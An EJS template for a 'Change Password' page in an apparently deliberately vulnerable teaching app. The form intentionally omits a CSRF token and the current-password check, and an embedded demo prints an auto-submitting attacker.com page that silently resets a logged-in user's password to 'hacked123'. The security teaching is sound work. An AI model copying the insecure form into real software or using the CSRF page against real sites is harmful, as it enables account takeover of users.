<%- include('partials/header') %>

<div class="section">
  <div class="page-header">
    <h2>Change Password</h2>
    <div class="vuln-badge csrf">CSRF + Broken Auth</div>
  </div>

  <div class="card">
    <% if (success) { %>
      <div class="alert success"><%= success %></div>
    <% } %>
    <% if (error) { %>
      <div class="alert error"><%= error %></div>
    <% } %>

    <!-- VULN: No CSRF token, no current password required -->
    <form method="POST" action="/change-password">
      <div class="form-group">
        <label>New Password</label>
        <input type="password" name="new_password" placeholder="Enter new password" required>
      </div>
      <!-- No current_password field = no verification -->
      <!-- No hidden csrf_token field -->
      <button type="submit" class="btn btn-primary">Change Password</button>
    </form>

    <div class="exploit-box">
      <h4>CSRF Attack Demo</h4>
      <p>An attacker hosts this page. When a logged-in user visits it, their password is silently changed:</p>
      <pre class="code-block">&lt;!-- attacker.com/csrf-attack.html --&gt;
&lt;html&gt;
&lt;body onload="document.forms[0].submit()"&gt;
  &lt;form method="POST" action="http://localhost:3000/change-password"&gt;
    &lt;input type="hidden" name="new_password" value="hacked123"&gt;
  &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
      <p class="vuln-explain">
        <strong>Why it works:</strong> No CSRF token in the form. 
        Browser automatically sends session cookie with cross-origin POST.
        Also: no <code>current_password</code> required = anyone with session access can change it.
      </p>
    </div>
  </div>
</div>

<%- include('partials/footer') %>
